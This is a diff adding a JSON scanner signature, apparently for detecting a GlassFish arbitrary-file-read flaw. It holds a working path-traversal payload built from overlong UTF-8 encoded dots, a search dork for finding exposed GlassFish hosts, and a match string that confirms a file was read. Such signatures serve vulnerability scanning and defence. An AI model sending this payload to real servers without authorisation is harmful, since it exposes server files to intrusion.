@@ -1,0 +1,14 @@
+{
+    "name": "GlassFish_Arbitrary_File_Read",
+    "method": "GET",
+    "port": [
+        80
+    ],
+    "dork": "apps=GlassFish",
+    "suffix": [
+        "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/"
+    ],
+    "hits": [
+        "package-appclient.xml"
+    ]
+}
